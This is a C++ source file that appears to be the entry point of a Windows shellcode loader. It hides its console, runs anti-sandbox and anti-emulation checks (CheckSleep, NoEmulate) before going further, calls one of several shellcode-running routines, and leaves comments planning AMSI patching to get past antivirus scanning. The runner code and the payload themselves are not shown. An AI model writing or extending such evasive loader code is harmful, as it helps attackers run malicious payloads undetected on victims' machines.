#include <Windows.h>
#include "Runners.h"
#include "Heuristics.h"

// Add arguments to select preferred shellcode running method, add heuristics, amsi patching 
// Console
int main(void)
{
	FreeConsole();			// hide console if using console version
	// check arguments (max 1)

	// call heuristic functions
	if ((heuristic::Heuristic::CheckSleep()) || (heuristic::Heuristic::NoEmulate()))
	{
		return 0;
	}
	
		
	// patch amsi

	// determine function to call based on argument provided, case insensitive

	//runner::Runner::Run();
	//runner::Runner::piRun();
	runner::Runner::epsRun();
	
	return 0;
}

// GUI support (hide console)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
// int main(void)
{
	// check arguments (max 1)

	// call heuristic functions
	if ((heuristic::Heuristic::CheckSleep()) || (heuristic::Heuristic::NoEmulate()))
	{
		return 0;
	}


	// patch amsi

	// determine function to call based on argument provided, case insensitive

	runner::Runner::Run();
	//runner::Runner::piRun();
	//runner::Runner::epsRun();

	return 0;
}
